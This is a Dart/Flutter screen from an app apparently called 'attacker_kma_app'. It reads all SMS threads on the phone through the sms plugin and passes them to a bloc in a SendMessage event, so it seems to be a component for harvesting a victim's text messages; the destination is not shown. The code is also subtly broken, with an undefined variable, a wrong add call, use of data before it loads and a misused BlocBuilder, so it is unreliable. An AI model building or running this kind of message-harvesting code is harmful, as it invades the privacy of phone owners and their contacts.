import 'package:attacker_kma_app/blocs/messages/message_bloc.dart';
import 'package:attacker_kma_app/blocs/messages/message_event.dart';
import 'package:attacker_kma_app/common_widgets/content_message.dart';
import 'package:attacker_kma_app/models/message.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:sms/sms.dart';

import '../../common_widgets/content_message.dart';

class MessageScreen extends StatelessWidget {
  List<SmsThread> threads;

  MessageBloc _messageBloc;

  SmsQuery query = SmsQuery();

  MessageModel messageModel = MessageModel();

  getContactSMS() async => threads = await query.getAllThreads;

  String address;

  List<Message> listMessage = [];

  @override
  Widget build(BuildContext context) {
    threads.forEach((element) {
      listMessage.add(element.contact.address.toString(), element.messages);
    });

    return FutureBuilder(
      future: getContactSMS(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) {
          return Center(child: CircularProgressIndicator());
        } else {
          return BlocBuilder(
            bloc: _messageBloc = MessageBloc()
              ..add(SendMessage(messages: threads.addAll(th))),
            child: Column(
              children: [
                Expanded(
                  child: ListView.builder(
                    itemCount: threads.length,
                    itemBuilder: (context, index) {
                      return MessageWidget(
                        profilePics: "https://bit.ly/3d3hq8j",
                        title: threads[index].contact.address,
                        content: threads[index].messages.length.toString(),
                      );
                    },
                  ),
                ),
                FlatButton(
                  onPressed: () {},
                  child: Text('Gui'),
                )
              ],
            ),
          );
        }
      },
    );
  }
}
